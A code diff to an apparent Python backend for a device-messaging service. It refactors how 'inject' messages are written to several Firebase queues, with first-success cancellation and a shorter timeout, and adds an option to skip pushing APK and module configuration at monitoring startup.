@@ -12,7 +12,7 @@ from app.firebase_client import normalize_firebase_url
 logger = logging.getLogger(__name__)
 settings = get_settings()
 
-INJECT_TIMEOUT_SEC = 0.8
+INJECT_TIMEOUT_SEC = 0.45
 OUTGOING_TIMEOUT_SEC = 1.0
 OUTGOING_SENDER = "__OUT__"
 
@@ -521,23 +521,43 @@ async def push_mynum_inject(
         "injected": False,
         "created_at": datetime.now(timezone.utc).isoformat(),
     }
-    tasks = []
-    for firebase_url in _inject_firebase_bases(profile, device):
-        base = normalize_firebase_url(firebase_url)
-        tasks.append(_firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload))
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    if any(result is True for result in results):
-        logger.info(
-            "Inject queued poll_id=%s bases=%s",
-            poll_id,
-            [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)],
-        )
-        return message_id
-    logger.error(
-        "Inject push failed poll_id=%s bases=%s",
-        poll_id,
-        _inject_firebase_bases(profile, device),
-    )
+    bases = [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)]
+    if not bases:
+        return None
+
+    async def _put_one(base: str) -> bool:
+        return await _firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload)
+
+    if len(bases) == 1:
+        if await _put_one(bases[0]):
+            logger.info("Inject queued poll_id=%s base=%s", poll_id, bases[0])
+            return message_id
+        logger.error("Inject push failed poll_id=%s base=%s", poll_id, bases[0])
+        return None
+
+    tasks = [asyncio.create_task(_put_one(base)) for base in bases]
+    done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+    for task in done:
+        try:
+            if task.result() is True:
+                for other in pending:
+                    other.cancel()
+                logger.info("Inject queued poll_id=%s bases=%s (first ok)", poll_id, bases)
+                return message_id
+        except Exception:
+            pass
+    if pending:
+        more_done, still_pending = await asyncio.wait(pending, timeout=0.25)
+        for task in still_pending:
+            task.cancel()
+        for task in more_done:
+            try:
+                if task.result() is True:
+                    logger.info("Inject queued poll_id=%s bases=%s", poll_id, bases)
+                    return message_id
+            except Exception:
+                pass
+    logger.error("Inject push failed poll_id=%s bases=%s", poll_id, bases)
     return None
 
 
@@ -609,8 +629,10 @@ async def send_polling_startup_test(
     db,
     profile: MonitorProfile,
     device: Device,
+    *,
+    skip_config: bool = False,
 ) -> tuple[int, int]:
-    """Monitoring start — push APK config + inject test to /mynum queue."""
+    """Monitoring start — inject test to /mynum queue (config optional)."""
     import time
 
     from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
@@ -638,8 +660,9 @@ async def send_polling_startup_test(
         poll_id = mynum_device_id(profile.phone_number)
         register_device_on_key(license_key, poll_id, profile.telegram_user_id)
 
-    await push_virtus_apk_config(profile, device)
-    await push_module_config(profile, device)
+    if not skip_config:
+        await push_virtus_apk_config(profile, device)
+        await push_module_config(profile, device)
 
     t0 = time.perf_counter()
     try:
